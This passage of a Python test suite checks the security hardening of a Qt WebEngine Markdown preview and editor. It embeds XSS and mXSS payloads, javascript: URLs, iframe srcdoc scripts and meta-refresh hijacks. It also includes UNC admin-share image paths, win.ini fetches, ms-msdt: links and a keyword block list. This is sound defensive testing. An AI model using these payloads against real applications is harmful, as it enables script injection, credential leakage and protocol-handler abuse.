            "mermaid: mermaid.mermaidAPI.getConfig().securityLevel,"
            "katexLinks: document.querySelectorAll('.katex a').length,"
            "url: location.href})")))
        assert dom["frames"] == 0
        assert dom["lute"] is True
        assert dom["mermaid"] == "strict"
        assert dom["katexLinks"] == 0
        assert dom["url"].startswith("file:")

        # Clicking every rendered node/link must not execute anything either.
        _eval(view, (
            "document.querySelectorAll('.vditor-wysiwyg svg .node, .vditor-wysiwyg svg a,"
            " .vditor-wysiwyg a, .vditor-wysiwyg .katex').forEach(function(n){"
            "n.dispatchEvent(new MouseEvent('click',{bubbles:true,cancelable:true,view:window}))"
            "});"))
        _wait(1000)
        assert json.loads(_eval(view, _PW_FLAGS_JS))["flags"] == []

        # The display layer is cleaned, the Markdown source is not.
        value = _eval(view, "window.__wysiwygGlue.getValue()")
        assert "<iframe srcdoc=" in value and "click A call eval" in value
        # The UNC image was seen and refused by the request guard.
        assert any(url.startswith("file://127.0.0.1/") and blocked
                   for url, blocked in decisions), decisions
        assert _eval(view, (
            "Array.from(document.images).filter(function(i){"
            "return /127\\.0\\.0\\.1/.test(i.getAttribute('src'))})[0].naturalWidth")) == 0
        settings = view.page().settings()
        assert not settings.testAttribute(QWebEngineSettings.WebAttribute.JavascriptCanOpenWindows)
        assert settings.testAttribute(
            QWebEngineSettings.WebAttribute.LocalContentCanAccessFileUrls)
    finally:
        view.close()
        view.deleteLater()
        _wait(150)


@_webengine
def test_wysiwyg_glue_sanitizer_strips_active_content(qapp, isolated_wysiwyg_settings):
    from app.wysiwyg_view import WysiwygView

    view = WysiwygView()
    try:
        assert _until(lambda: view._ready, 40000)
        cases = {
            "srcdoc": '<div><iframe srcdoc="&lt;script&gt;x&lt;/script&gt;"></iframe></div>',
            "events": '<img src="a.png" onerror="x()"><b onmouseover="y()">b</b>',
            "urls": ('<a href=" jav&#x09;ascript:x()">a</a><a href="vbscript:x">b</a>'
                     '<a href="data:text/html,x">c</a><img src="data:image/png;base64,AA">'),
            "tags": ('<embed src="a"><object data="b"></object><form action="c"></form>'
                     '<meta http-equiv="refresh"><base href="d"><script>e()</script>'
                     '<frameset></frameset><link rel="stylesheet" href="f">'),
            "mxss": '<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>',
            "svg": '<svg><a xlink:href="javascript:x()"><set attributeName="href" '
                   'to="javascript:y()"/></a></svg>',
            # data:image forces the parse/serialize pass on benign content.
            "keep": ('<div class="vditor-wysiwyg__block" data-type="html-block" '
                     'data-md-source="&lt;iframe&gt;"><p>ok <a href="b.md">b</a>'
                     '<img src="data:image/png;base64,AA" alt="i"></p></div>'),
        }
        out = json.loads(_eval(view, "JSON.stringify((function(c){var o={};"
                               "Object.keys(c).forEach(function(k){"
                               "o[k]=window.__wysiwygGlue._sanitizeHtml(c[k]);});return o;})("
                               + json.dumps(cases) + "))"))
        for key in ("srcdoc", "events", "urls", "tags", "mxss", "svg"):
            assert _dangerous_constructs(out[key].replace("<svg>", "").replace("</svg>", ""))\
                == [], (key, out[key])
            for word in ("iframe", "srcdoc", "onerror", "onmouseover", "javascript",
                         "vbscript", "data:text", "<embed", "<object", "<form", "<meta",
                         "<base", "<script", "<frameset", "<link", "<noscript"):
                assert word not in out[key].lower(), (key, word, out[key])
        assert 'src="data:image/png;base64,AA"' in out["urls"]
        kept = json.loads(_eval(view, (
            "JSON.stringify((function(h){var t=document.createElement('template');"
            "t.innerHTML=h;var d=t.content.firstElementChild;return {cls:d.className,"
            "src:d.getAttribute('data-md-source'),href:t.content.querySelector('a')"
            ".getAttribute('href'),img:t.content.querySelector('img').getAttribute('src')};})("
            + json.dumps(out["keep"]) + "))")))
        assert kept == {"cls": "vditor-wysiwyg__block", "src": "<iframe>", "href": "b.md",
                        "img": "data:image/png;base64,AA"}
    finally:
        view.close()
        view.deleteLater()
        _wait(150)


@_webengine
def test_wysiwyg_device_namespace_unc_images_never_load(
    qapp, tmp_path, monkeypatch, isolated_wysiwyg_settings
):
    """Bypass review high-1 (W): //./UNC/host and file:////./UNC/host."""
    from app.wysiwyg_view import WysiwygView

    decisions = _record_guard_decisions(monkeypatch)
    document = tmp_path / "unc.md"
    markdown = (
        f"# unc\n\n![w1](file:////./UNC/{_ADMIN_IMAGE})\n\n"
        f'<img src="//./UNC/{_ADMIN_IMAGE}">\n\n'
        f"![w3](//?/UNC/{_ADMIN_IMAGE})\n\n"
        f'<img src="//./UNC/localhost/ADMIN$/Web/Wallpaper/Windows/img0.jpg">\n'
    )
    document.write_text(markdown, encoding="utf-8")
    view = WysiwygView()
    try:
        _boot_wysiwyg(view, document, markdown)
        assert _until(lambda: len(_unc_image_widths(view)) >= 2, 5000)
        _wait(3000)
        widths = _unc_image_widths(view)
        assert len(widths) >= 2 and all(width == 0 for width in widths), widths
        if decisions:
            assert not [d for d in decisions if not d[1] and (
                (d[0].startswith("file:") and "UNC" in d[0]) or not d[0])]
    finally:
        view.close()
        view.deleteLater()
        _wait(150)


@_webengine
def test_preview_mermaid_label_device_namespace_unc_image_never_loads(
    qapp, tmp_path, monkeypatch
):
    """Bypass review high-1 (P): Mermaid htmlLabel <img src='//./UNC/...'>."""
    decisions = _record_guard_decisions(monkeypatch)
    document = tmp_path / "mermaid-unc.md"
    document.write_text(
        "# m\n\n```mermaid\ngraph TD\n"
        f"A[\"<img src='//./UNC/{_ADMIN_IMAGE}'>\"]-->B\n"
        f"C[\"<img src='//?/UNC/{_ADMIN_IMAGE}'>\"]-->B\n```\n",
        encoding="utf-8",
    )
    view = renderer.RendererView()
    try:
        view.resize(1000, 800)
        view.show()
        _load_preview(view, document)
        assert _until(lambda: _eval(view, "document.querySelectorAll('.mermaid svg').length") == 1)
        assert _until(lambda: len(_unc_image_widths(view)) >= 1, 5000)
        _wait(3000)
        widths = _unc_image_widths(view)
        assert widths and all(width == 0 for width in widths), widths
        if decisions:
            assert not [d for d in decisions if not d[1] and (
                (d[0].startswith("file:") and "UNC" in d[0]) or not d[0])]
    finally:
        view.close()
        view.deleteLater()
        _wait(150)


_EDITOR_URL_JS = "location.protocol + '|' + !!window.__wysiwygGlue + '|' + !!window.__evil"


@_webengine
def test_wysiwyg_meta_refresh_cannot_replace_the_editor(
    qapp, tmp_path, isolated_wysiwyg_settings
):
    """Bypass review N20 / high-2: no top-level navigation away from the host."""
    from app.wysiwyg_view import WysiwygView

    evil = _evil_page(tmp_path)
    document = tmp_path / "doc.md"
    document.write_text("# keep me\n\nbody", encoding="utf-8")
    view = WysiwygView()
    seen = _watch_bridge(view)
    try:
        _boot_wysiwyg(view, document, "# keep me\n\nbody")
        host_url = view.page().url().toString()
        target = QUrl.fromLocalFile(str(evil)).toString()
        # Not via Lute: straight into the content, as a hypothetical
        # unsanitized path would; the refresh is scheduled before any cleanup.
        _eval(view, (
            "(function(){var m=document.createElement('meta');"
            "m.httpEquiv='refresh';m.content='0;url=" + target + "';"
            "document.querySelector('.vditor-reset').appendChild(m);"
            "location.href=" + json.dumps(target) + ";return 1;})()"))
        _wait(3000)
        assert not any("EVIL" in str(args) for args in seen), seen
        assert view.page().url().toString() == host_url
        assert _eval(view, _EDITOR_URL_JS) == "file:|true|false"
        assert view._ready
        view.load_markdown("# next document")
        assert _until(lambda: "# next document" in (
            _eval(view, "window.__wysiwygGlue.getValue()") or ""), 10000)
    finally:
        view.close()
        view.deleteLater()
        _wait(150)


@_webengine
def test_wysiwyg_mermaid_href_click_cannot_replace_the_editor(
    qapp, tmp_path, isolated_wysiwyg_settings
):
    """Bypass review N35/N37: a real click on a Mermaid `click href` node."""
    from PySide6.QtCore import QPoint, Qt

    from app.wysiwyg_view import WysiwygView

    evil = _evil_page(tmp_path)
    target = QUrl.fromLocalFile(str(evil)).path()  # "/C:/.../evil.html"
    markdown = (
        "```mermaid\ngraph TD\nM[CLICKME]-->N[other]\n"
        f'click M href "{target}"\n```\n\n# after\n'
    )
    document = tmp_path / "click.md"
    document.write_text(markdown, encoding="utf-8")
    view = WysiwygView()
    seen = _watch_bridge(view)
    try:
        view.resize(1000, 800)
        view.show()
        view.set_document_path(document)
        assert _until(lambda: view._ready, 40000)
        view.load_markdown(markdown)
        anchor = ("document.querySelector('.vditor-wysiwyg .language-mermaid svg a') || "
                  "Array.from(document.querySelectorAll('.vditor-wysiwyg .language-mermaid "
                  "svg .node')).find(function(n){return /CLICKME/.test(n.textContent);})")
        assert _until(lambda: _eval(view, f"!!({anchor})") is True, 20000)
        host_url = view.page().url().toString()
        rect = json.loads(_eval(view, (
            f"JSON.stringify((function(){{var n={anchor};n.scrollIntoView({{block:'center'}});"
            "var r=n.getBoundingClientRect();return {x:r.left+r.width/2,y:r.top+r.height/2};"
            "})())")))
        window = view.windowHandle()
        assert window is not None
        window.requestActivate()
        QTest.mouseClick(window, Qt.MouseButton.LeftButton, Qt.KeyboardModifier.NoModifier,
                         QPoint(round(rect["x"]), round(rect["y"])))
        _wait(3000)
        assert not any("EVIL" in str(args) for args in seen), seen
        assert view.page().url().toString() == host_url
        assert _eval(view, _EDITOR_URL_JS) == "file:|true|false"
        assert view._ready
    finally:
        view.close()
        view.deleteLater()
        _wait(150)


@_webengine
def test_wysiwyg_foreign_page_resets_bridge_and_restores_the_editor(
    qapp, tmp_path, isolated_wysiwyg_settings
):
    """If anything ever commits a non-host URL, nothing crosses the bridge."""
    from app.wysiwyg_view import WysiwygView

    document = tmp_path / "doc.md"
    document.write_text("# restore me", encoding="utf-8")
    view = WysiwygView()
    seen = _watch_bridge(view)
    snapshots = []
    try:
        _boot_wysiwyg(view, document, "# restore me")
        view._on_page_url_changed(QUrl("file:///C:/attacker/evil.html"))
        assert view._foreign_page is True and view._ready is False
        view._bridge.saveWithContent("EVIL", view._generation, 0, 0, "", 0, 4)
        view.request_markdown_snapshot(snapshots.append)
        assert snapshots == ["# restore me"]  # Python's copy, not the page's
        assert not any("EVIL" in str(args) for args in seen)
        # The host page is reloaded with the live document.
        assert _until(lambda: view._ready and not view._foreign_page, 40000)
        assert _until(lambda: "# restore me" in (
            _eval(view, "window.__wysiwygGlue.getValue()") or ""), 10000)
    finally:
        view.close()
        view.deleteLater()
        _wait(150)


@_webengine
def test_wysiwyg_csp_blocks_external_script_in_srcdoc(
    qapp, tmp_path, isolated_wysiwyg_settings
):
    """Bypass review medium-4: 'self' let <iframe srcdoc><script src=file:...> run."""
    from app.wysiwyg_view import WysiwygView

    script = tmp_path / "x.js"
    script.write_text("try{parent.__pw_ext=1}catch(e){};window.__pw_ext=1;", encoding="utf-8")
    src = QUrl.fromLocalFile(str(script)).toString()
    document = tmp_path / "doc.md"
    document.write_text("# csp", encoding="utf-8")
    view = WysiwygView()
    try:
        _boot_wysiwyg(view, document, "# csp")
        _eval(view, (
            "(function(){window.__violations=[];document.addEventListener("
            "'securitypolicyviolation',function(e){window.__violations.push("
            "e.effectiveDirective)});var f=document.createElement('iframe');"
            "f.srcdoc='<script src=" + json.dumps(src)[1:-1] + "></scr'+'ipt>';"
            "document.body.appendChild(f);var s=document.createElement('div');"
            "s.innerHTML='<img src=x onerror=\"window.__pw_inline=1\">';"
            "document.body.appendChild(s);return 1;})()"))
        _wait(2500)
        assert _eval(view, "String(window.__pw_ext)+'|'+String(window.__pw_inline)") == \
            "undefined|undefined"
    finally:
        view.close()
        view.deleteLater()
        _wait(150)


def _load_preview(view, path):
    ready = []
    view.content_ready.connect(lambda *args: ready.append(args))
    view.load_file(path)
    assert _until(lambda: bool(ready), 30000), "preview never became ready"
    _wait(500)


@_webengine
def test_preview_csp_blocks_websocket_and_fetch_but_features_still_work(
    qapp, tmp_path, monkeypatch, sink
):
    port, hits = sink
    decisions = _record_guard_decisions(monkeypatch)
    document = tmp_path / "features.md"
    document.write_text(
        "# Features\n\n- [ ] first task\n- [x] done task\n\n$E=mc^2$\n\n"
        "```python\nprint('copy me')\n```\n\n```mermaid\ngraph TD\nA-->B\n```\n\n"
        "![unc](//127.0.0.1/C$/Windows/Web/Wallpaper/Windows/img0.jpg)\n",
        encoding="utf-8",
    )
    view = renderer.RendererView()
    toggles = []
    view.bridge.taskToggled.connect(lambda line, checked: toggles.append((line, checked)))
    try:
        view.resize(1000, 800)
        view.show()
        _load_preview(view, document)
        assert _until(lambda: _eval(view, "document.querySelectorAll('.katex').length") == 1)
        assert _until(lambda: _eval(view, "document.querySelectorAll('.mermaid svg').length") == 1)
        assert _eval(view, "document.querySelectorAll('div.highlight .copy-btn').length") == 1
        assert _eval(view, "document.querySelectorAll('img').length") == 0  # UNC image refused

        # QWebChannel + task list interaction still reach Python.
        def click_task():
            _eval(view, "document.querySelector('.task-list-item-checkbox').click()")
            return _until(lambda: bool(toggles), 1500)

        assert _until(click_task, 15000), "task toggle never reached the bridge"

        probe = f"""
          window.__probe = {{violations: []}};
          document.addEventListener('securitypolicyviolation', function (e) {{
            window.__probe.violations.push(e.violatedDirective);
          }});
          try {{
            var ws = new WebSocket('ws://127.0.0.1:{port}/ws');
            ws.onopen = function () {{ window.__probe.ws = 'open'; }};
            ws.onerror = function () {{ window.__probe.ws = 'error'; }};
          }} catch (e) {{ window.__probe.ws = 'throw'; }}
          fetch('http://127.0.0.1:{port}/fetch').then(
            function () {{ window.__probe.fetch = 'ok'; }},
            function () {{ window.__probe.fetch = 'blocked'; }});
          fetch('file:///C:/Windows/win.ini').then(
            function () {{ window.__probe.file = 'ok'; }},
            function () {{ window.__probe.file = 'blocked'; }});
          try {{ navigator.sendBeacon('http://127.0.0.1:{port}/beacon', 'x'); }} catch (e) {{}}
          true;
        """
        _eval(view, probe)
        assert _until(lambda: json.loads(_eval(view, "JSON.stringify(window.__probe)") or "{}")
                      .get("file") is not None, 5000)
        _wait(1500)
        result = json.loads(_eval(view, "JSON.stringify(window.__probe)"))
        assert result["ws"] != "open"
        assert result["fetch"] == "blocked" and result["file"] == "blocked"
        assert "connect-src" in result["violations"]
        assert hits == []

        settings = view.page().settings()
        assert not settings.testAttribute(QWebEngineSettings.WebAttribute.JavascriptCanOpenWindows)
        assert _eval(view, "String(window.open('about:blank'))") == "null"

        # The guard also covers raw file://host requests on preview pages.
        view.page().setHtml(
            '<img src="file://127.0.0.1/C$/Windows/Web/Wallpaper/Windows/img0.jpg">',
            QUrl.fromLocalFile(str(tmp_path) + "/"))
        assert _until(lambda: any(
            url.startswith("file://127.0.0.1/") and blocked for url, blocked in decisions), 5000)
    finally:
        view.close()
        view.deleteLater()
        _wait(150)


@_webengine
def test_preview_link_and_anchor_clicks_work(qapp, tmp_path):
    other = tmp_path / "other.md"
    other.write_text("# Other", encoding="utf-8")
    filler = "\n\n".join(f"Paragraph {n} " + "text " * 40 for n in range(80))
    document = tmp_path / "links.md"
    document.write_text(
        f"# Top\n\n[jump](#target) and [other](other.md)\n\n{filler}\n\n## Target\n\nend\n",
        encoding="utf-8",
    )
    view = renderer.RendererView()
    opened = []
    view.local_doc_clicked.connect(opened.append)
    try:
        view.resize(900, 600)
        view.show()
        _load_preview(view, document)
        assert _eval(view, "window.scrollY") == 0
        _eval(view, "document.querySelector('a[href=\"#target\"]').click()")
        assert _until(lambda: (_eval(view, "window.scrollY") or 0) > 500, 5000)
        assert _eval(view, "location.protocol + document.title") == "file:links"
        _eval(view, "document.querySelector('a[href=\"other.md\"]').click()")
        assert _until(lambda: bool(opened), 5000), "cross-note link click was lost"
        assert Path(opened[0]).resolve() == other.resolve()
    finally:
        view.close()
        view.deleteLater()
        _wait(150)


def _native_link_click(view, selector):
    """Click the element matching *selector* through Chromium's real input path (a user
    gesture: scripted .click() never launches external-protocol navigations)."""
    from PySide6.QtCore import QPoint, Qt

    rect = json.loads(_eval(view, (
        "JSON.stringify((function(){var r=document.querySelector(" + json.dumps(selector)
        + ").getBoundingClientRect();return {x:r.left+r.width/2,y:r.top+r.height/2};})())")))
    window = view.windowHandle()
    assert window is not None
    window.requestActivate()
    QTest.mouseClick(window, Qt.MouseButton.LeftButton, Qt.KeyboardModifier.NoModifier,
                     QPoint(round(rect["x"]), round(rect["y"])))


class _OsUrlSink(QObject):
    """QDesktopServices URL handler: Qt's own C++ openUrl lands here, not in the OS."""

    def __init__(self):
        super().__init__()
        self.urls: list[str] = []

    @Slot(QUrl)
    def handle(self, url):
        self.urls.append(url.toString())


_UNKNOWN_SCHEME_LINKS = {
    "foo": "foo://evil/path",
    "myapp": "myapp:/nohost",
    "ms-settings": "ms-settings:privacy",
    "search-ms": "search-ms:query=x",
}


@_webengine
def test_preview_real_click_on_unknown_scheme_never_reaches_the_os(qapp, tmp_path, monkeypatch):
    """F2: Chromium offers a *user-gesture* click on an unknown scheme to
    acceptNavigationRequest (Qt's external-protocol path); accepting it made Qt
    call QDesktopServices::openUrl from C++, past any Python-level patch.  A
    scripted .click() never got that far, so only a real mouse click shows it."""
    from PySide6.QtGui import QDesktopServices

    sink = _OsUrlSink()
    for scheme in _UNKNOWN_SCHEME_LINKS:
        QDesktopServices.setUrlHandler(scheme, sink, "handle")
    opened: list[str] = []
    monkeypatch.setattr(renderer.QDesktopServices, "openUrl",
                        lambda url: opened.append(url.toString()) or True)
    document = tmp_path / "schemes.md"
    document.write_text(
        "# S\n\n[control](https://example.com/control)\n\n"
        + "".join(f"[{name}]({href})\n\n" for name, href in _UNKNOWN_SCHEME_LINKS.items()),
        encoding="utf-8",
    )
    view = renderer.RendererView()
    try:
        view.resize(900, 600)
        view.show()
        _load_preview(view, document)
        # Positive control: the same real click on a whitelisted link works.
        _native_link_click(view, 'a[href^="https:"]')
        assert _until(lambda: bool(opened), 5000), "the real click never arrived"
        assert opened == ["https://example.com/control"]
        for name, href in _UNKNOWN_SCHEME_LINKS.items():
            assert _eval(view, f"document.querySelectorAll('a[href^=\"{name}:\"]').length") == 1
            _native_link_click(view, f'a[href^="{name}:"]')
            _wait(800)
            assert sink.urls == [], f"{href} was handed to the OS"
            assert opened == ["https://example.com/control"], f"{href} was opened"
        assert _eval(view, "location.protocol + document.title") == "file:schemes"
    finally:
        for scheme in _UNKNOWN_SCHEME_LINKS:
            QDesktopServices.unsetUrlHandler(scheme)
        view.close()
        view.deleteLater()
        _wait(150)


_NAV = QWebEnginePage.NavigationType


@pytest.mark.parametrize("nav_type", [
    _NAV.NavigationTypeLinkClicked, _NAV.NavigationTypeTyped,
    _NAV.NavigationTypeFormSubmitted, _NAV.NavigationTypeBackForward,
    _NAV.NavigationTypeReload, _NAV.NavigationTypeRedirect, _NAV.NavigationTypeOther,
])
def test_preview_refuses_unknown_schemes_for_every_navigation_type(qapp, monkeypatch, nav_type):
    """The external-protocol decision must not depend on how the navigation
    started (real click, script, form, redirect): unknown schemes never get a
    True that Qt would turn into an OS launch."""
    view = _FakePreviewView(current_path="C:/notes/a.md")
    page = renderer._DocumentPage(view)
    side_effects: list = []
    monkeypatch.setattr(renderer.QDesktopServices, "openUrl", side_effects.append)
    monkeypatch.setattr(renderer.QMessageBox, "warning", lambda *a: side_effects.append(a))
    monkeypatch.setattr(renderer.QMessageBox, "question", lambda *a: side_effects.append(a))
    for target in (*_UNKNOWN_SCHEME_LINKS.values(), "myapp://item/abc", "ms-msdt:/id",
                   "ssh://host/x", "callto:+123", "steam://run/1"):
        assert page.acceptNavigationRequest(QUrl(target), nav_type, True) is False, target
    QTest.qWait(20)
    assert side_effects == []


def test_preview_link_clicks_only_follow_the_whitelist(qapp, monkeypatch):
    view = _FakePreviewView(current_path="C:/notes/a.md")
    page = renderer._DocumentPage(view)
    opened: list[str] = []
    monkeypatch.setattr(renderer.QDesktopServices, "openUrl",
                        lambda url: opened.append(url.toString()))
    for target in ("about:blank", "data:text/html,x", "qrc:/x.html", "chrome://settings",
                   "blob:file:///x", "view-source:file:///C:/notes/a.md"):
        assert page.acceptNavigationRequest(QUrl(target), _CLICK, True) is False, target
    for target in ("https://example.com/", "http://example.com/", "mailto:a@example.com"):
        assert page.acceptNavigationRequest(QUrl(target), _CLICK, True) is False, target
    QTest.qWait(20)
    assert opened == ["https://example.com/", "http://example.com/", "mailto:a@example.com"]
    # The page's own loads (setHtml -> data:, large previews -> file:) still pass.
    typed = _NAV.NavigationTypeTyped
    assert page.acceptNavigationRequest(QUrl("data:text/html,x"), typed, True) is True
    assert page.acceptNavigationRequest(QUrl("file:///C:/notes/a.md"), typed, True) is True


@_webengine
def test_wysiwyg_about_blank_navigation_is_recovered_after_the_fact(
    qapp, tmp_path, isolated_wysiwyg_settings
):
    """Documents the limit: Chromium commits about:blank without calling
    acceptNavigationRequest (and loadStarted carries no target URL), so the
    editor cannot be shielded in advance; the urlChanged recovery restores it."""
    from app.wysiwyg_view import WysiwygView

    document = tmp_path / "doc.md"
    document.write_text("# keep me\n\nbody", encoding="utf-8")
    view = WysiwygView()
    seen = _watch_bridge(view)
    try:
        _boot_wysiwyg(view, document, "# keep me\n\nbody")
        _eval(view, "location.href='about:blank'; 1")
        assert _until(lambda: view._host_restore_count >= 1, 10000)
        assert _until(lambda: view._ready and not view._foreign_page, 40000)
        assert _until(lambda: "# keep me" in (
            _eval(view, "window.__wysiwygGlue.getValue()") or ""), 10000)
        assert _eval(view, _EDITOR_URL_JS) == "file:|true|false"
        assert not any("about" in str(args) for args in seen), seen
    finally:
        view.close()
        view.deleteLater()
        _wait(150)


@_webengine
def test_preview_toc_link_click_scrolls_to_the_heading(qapp, tmp_path):
    """D1b: [TOC] entries are real in-page anchors that scroll on click."""
    filler = "\n\n".join(f"Paragraph {n} " + "text " * 40 for n in range(80))
    document = tmp_path / "toc.md"
    document.write_text(
        f"# Top\n\n[TOC]\n\n{filler}\n\n## Target Heading\n\nend\n", encoding="utf-8")
    view = renderer.RendererView()
    try:
        view.resize(900, 600)
        view.show()
        _load_preview(view, document)
        assert _eval(view, "document.querySelectorAll('nav.md-toc a').length") == 2
        assert _eval(view, "window.scrollY") == 0
        _eval(view, "document.querySelector('nav.md-toc a[href=\"#target-heading\"]').click()")
        assert _until(lambda: (_eval(view, "window.scrollY") or 0) > 500, 5000)
        assert _eval(view, "location.protocol + document.title") == "file:toc"
    finally:
        view.close()
        view.deleteLater()
        _wait(150)
